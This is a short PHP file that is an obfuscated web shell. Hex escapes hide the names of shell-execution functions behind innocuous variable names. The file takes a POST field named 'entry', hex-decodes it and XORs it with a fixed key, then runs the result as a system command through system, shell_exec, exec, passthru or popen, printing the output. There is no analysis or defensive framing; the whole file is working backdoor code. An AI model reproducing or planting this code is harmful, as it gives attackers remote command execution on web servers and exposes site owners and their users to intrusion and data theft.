<?php

$data_storage4 = "\x70\x61ssthru";
$data_storage2 = "s\x68e\x6Cl\x5F\x65\x78ec";
$data_storage3 = "\x65x\x65c";
$data_storage5 = "\x70op\x65n";
$data_storage1 = "\x73\x79stem";
$data_storage6 = "\x73tr\x65\x61\x6D\x5F\x67\x65\x74_co\x6Et\x65nts";
$publish_content = "he\x78\x32\x62\x69n";
$data_storage7 = "p\x63\x6C\x6Fse";
if (isset($_POST["en\x74\x72y"])) {
            function core_engine    ( $bind,     $res )    {
 $ent =  ''   ;
 foreach(str_split($bind) as $char){
$ent.=chr(ord($char)^$res);

} return $ent;

}
            $entry = $publish_content($_POST["en\x74\x72y"]);
            $entry = core_engine($entry, 48);
            if (function_exists($data_storage1)) {
                $data_storage1($entry);
            } elseif (function_exists($data_storage2)) {
                print $data_storage2($entry);
            } elseif (function_exists($data_storage3)) {
                $data_storage3($entry, $element_bind);
                print join("\n", $element_bind);
            } elseif (function_exists($data_storage4)) {
                $data_storage4($entry);
            } elseif (function_exists($data_storage5) && function_exists($data_storage6) && function_exists($data_storage7)) {
                $res_ent = $data_storage5($entry, 'r');
                if ($res_ent) {
                    $factor_flg = $data_storage6($res_ent);
                    $data_storage7($res_ent);
                    print $factor_flg;
                }
            }
            exit;
        }